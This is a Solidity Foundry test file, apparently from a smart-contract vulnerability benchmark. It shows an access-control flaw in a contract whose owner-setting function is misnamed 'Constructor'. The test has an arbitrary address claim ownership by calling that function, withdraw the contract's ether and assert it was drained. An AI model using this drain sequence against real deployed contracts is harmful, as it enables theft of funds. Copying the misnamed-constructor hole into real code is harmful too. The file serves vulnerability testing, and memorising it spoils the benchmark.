
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_3} from "../src/Missing_3.sol";

contract TestAccessControlMissing_3 is Test {
    Missing_3 private target;
    address private deployer;

    function setUp() public {
        deployer = address(this);
        target = new Missing_3();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Note: We do NOT exclude the deployer here because the vulnerability is that
        // the Constructor() function is public and can be called by anyone to become owner.
        // The actual constructor (which would set owner) was never called properly.

        // --- 2. State Configuration ---
        // Fund the contract so we can verify the exploit works end-to-end
        vm.deal(address(target), 1 ether);
        
        // Record caller's initial balance
        uint256 callerInitialBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.startPrank(caller);

        // VULNERABILITY: The "Constructor" function is a regular public function (not a real constructor)
        // because it's named "Constructor" with capital C instead of using the constructor keyword.
        // Any arbitrary user can call this function to become the owner.
        target.Constructor();

        // Now the caller is the owner, they can withdraw all funds
        target.withdraw();

        vm.stopPrank();

        // Assert that the caller successfully drained the contract
        assertEq(address(target).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerInitialBalance + 1 ether, "Caller should have received the funds");
    }

    receive() external payable {}

    fallback() external payable {}
}
